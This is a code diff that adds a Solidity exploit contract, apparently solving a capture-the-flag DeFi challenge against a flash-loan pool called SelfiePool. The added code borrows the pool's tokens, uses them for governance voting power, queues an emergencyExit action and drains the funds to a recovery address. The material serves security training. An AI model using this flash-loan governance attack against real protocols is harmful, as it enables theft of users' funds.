@@ -75,3 +75,50 @@ contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
         emit EmergencyExit(receiver, amount);
     }
 }
+
+contract Attack is IERC3156FlashBorrower {
+    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
+    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
+
+    SimpleGovernance public governance;
+    SelfiePool public pool;
+    IERC20 public token;
+
+    uint256 actionId;
+    address public recovery;
+
+    constructor(address _pool, address _governance, address _token, address _recovery) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = IERC20(_token);
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        uint256 amountToFlashLoan = pool.maxFlashLoan(address(token));
+        pool.flashLoan(this, address(pool.token()), amountToFlashLoan, "");
+    }
+
+    function onFlashLoan(address _initiator, address _token, uint256 _amount, uint256, bytes calldata)
+        external
+        override
+        returns (bytes32)
+    {
+        require(_initiator == address(this), "Flash loan initiated by untrusted contract");
+        require(_token == address(token), "Token is not the pool's token");
+
+        address(token).call(abi.encodeWithSignature("delegate(address)", address(this)));
+        actionId =
+            governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", address(this)));
+
+        token.approve(address(pool), _amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() public {
+        governance.executeAction(actionId);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
